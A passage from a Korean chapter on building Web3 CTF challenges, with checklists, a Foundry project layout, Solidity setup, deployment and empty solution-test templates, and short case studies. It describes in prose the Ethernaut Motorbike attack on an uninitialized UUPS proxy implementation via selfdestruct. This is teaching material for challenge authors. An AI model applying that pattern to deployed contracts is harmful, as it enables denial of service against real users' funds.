서버 검증:
□ nc localhost 1337 연결 가능
□ 풀이 제출 시 플래그 반환
□ 동시 접속 처리 가능 (부하 테스트)
```

### 6.2 문제 품질 검증

```
설계 검증:
□ 단일 핵심 개념 (여러 개면 각각 독립적인지 확인)
□ 승리 조건이 명확하고 코드로 표현됨
□ 문제 설명이 충분한 정보를 제공
□ 힌트 계층이 준비됨

난이도 검증:
□ Easy: 초보자 2명 이상이 60분 내 풀 수 있음
□ Medium: 중급자 2명 이상이 90분 내 풀 수 있음
□ Hard: 고급자 2명 이상이 4시간 내 풀 수 있음
□ 예상 시간 ±30% 이내 검증

윤리 검증:
□ 실제 프로토콜 코드 무단 복제 없음
□ 오픈소스 라이선스 준수
□ 교육적 목적에 부합
```

### 6.3 운영 체크리스트

```
대회 전:
□ 인프라 부하 테스트 완료
□ 플래그 형식 일관성 확인 (CTF{...})
□ 배포 자동화 스크립트 테스트
□ 롤백 절차 준비

대회 중:
□ 모니터링 대시보드 활성
□ Discord/Slack 지원 채널 운영
□ 오류 발생 시 대응팀 대기

대회 후:
□ 풀이 공개 (write-up)
□ 취약점 패턴 문서화
□ 다음 대회를 위한 회고
```

---

## 7. Foundry 프로젝트 템플릿

### 7.1 전체 CTF 프로젝트 구조

```
web3-ctf-template/
├── challenges/
│   ├── easy/
│   │   ├── storage-secret/
│   │   │   ├── src/Challenge.sol
│   │   │   ├── src/Setup.sol
│   │   │   ├── test/Solve.t.sol
│   │   │   ├── script/Deploy.s.sol
│   │   │   ├── Dockerfile
│   │   │   └── README.md
│   │   └── origin-check/
│   ├── medium/
│   └── hard/
├── infrastructure/
│   ├── docker-compose.yml
│   ├── nginx.conf
│   └── ctfd/
├── scripts/
│   ├── deploy-all.sh
│   ├── verify-all.sh
│   └── generate-flags.py
└── foundry.toml
```

### 7.2 기본 Setup 컨트랙트 템플릿

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title CTF Challenge Setup Template
 * @notice 모든 CTF 문제의 기본 Setup 구조
 */
abstract contract BaseSetup {
    address public immutable player;
    bool private _solved;

    modifier onlyPlayer() {
        require(msg.sender == player, "Not player");
        _;
    }

    constructor(address _player) {
        player = _player;
    }

    function isSolved() external view returns (bool) {
        return _solved;
    }

    function _setSolved() internal {
        _solved = true;
        emit ChallengeSolved(player);
    }

    event ChallengeSolved(address indexed player);
}
```

### 7.3 배포 스크립트 템플릿

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/Setup.sol";

contract DeployScript is Script {
    function run() external returns (address setupAddr) {
        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        address player = vm.envAddress("PLAYER_ADDRESS");

        vm.startBroadcast(deployerKey);

        Setup setup = new Setup{value: 10 ether}(player);
        setupAddr = address(setup);

        vm.stopBroadcast();

        console.log("Setup deployed at:", setupAddr);
        console.log("Challenge deployed at:", address(setup.challenge()));
        console.log("Player:", player);
    }
}
```

### 7.4 솔루션 테스트 템플릿

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Setup.sol";

/**
 * @title Solution Test Template
 * @notice CTF 풀이 검증 템플릿
 */
contract SolveTest is Test {
    Setup setup;
    address player = makeAddr("player");

    function setUp() public {
        // 초기 ETH 지급
        vm.deal(address(this), 100 ether);
        vm.deal(player, 10 ether);

        // Setup 배포
        setup = new Setup{value: 10 ether}(player);

        console.log("=== Challenge Setup ===");
        console.log("Setup:", address(setup));
        console.log("Player:", player);
        console.log("Initial balance:", address(setup.challenge()).balance);
    }

    function testSolve() public {
        console.log("\n=== Starting Attack ===");

        vm.startPrank(player);

        // ===== 여기에 풀이 구현 =====



        // ============================

        vm.stopPrank();

        assertTrue(setup.isSolved(), "Challenge not solved");
        console.log("\n=== Challenge Solved! ===");
    }
}
```

---

## 8. 실제 CTF 출제 사례 연구

### 8.1 Paradigm CTF 2022 - babysol

이 문제는 EVM 바이트코드를 직접 작성하여 제약 조건을 만족시키는 문제였다. 핵심 학습 포인트:
- CODECOPY 옵코드
- 런타임 바이트코드와 배포 바이트코드의 구분
- 최소 크기의 바이트코드 작성

### 8.2 Ethernaut 25번 Motorbike 제작 관점

UUPS 프록시의 초기화 취약점:
1. 구현 컨트랙트가 직접 초기화되지 않은 상태
2. selfdestruct를 구현 컨트랙트에 실행
3. 프록시가 delegatecall할 수 없게 됨 (DoS)

이 문제의 제작 핵심은 "왜 구현 컨트랙트도 초기화해야 하는가"를 직관적으로 보여주는 것이다.

---

*이 챕터를 마치면 독자는 Easy부터 Expert까지 다양한 난이도의 CTF 문제를 설계하고 구현하며, Docker 기반으로 배포할 수 있는 능력을 갖추게 된다. 문제 제작 경험은 취약점에 대한 이해를 한층 깊게 만들어준다.*
